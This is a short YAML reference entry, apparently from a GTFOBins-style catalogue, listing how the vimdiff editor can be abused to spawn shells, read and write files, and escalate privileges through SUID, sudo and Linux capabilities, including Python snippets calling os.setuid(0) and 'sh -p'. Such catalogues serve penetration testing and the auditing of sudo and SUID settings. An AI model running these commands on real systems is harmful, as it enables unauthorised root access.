---
functions:
  shell:
    - code: vimdiff -c ':!/bin/sh'
    - code: |
        vimdiff
        :set shell=/bin/sh
        :shell
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
      code: vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

  file-read:
    - code: vimdiff file_to_read

  file-write:
    - code: |
        vimdiff file_to_write
        iDATA
        ^[

  suid:
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

  sudo:
    - code: sudo vimdiff -c ':!/bin/sh'
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
      code: sudo vimdiff -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'


 capabilities:
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
      code: ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

---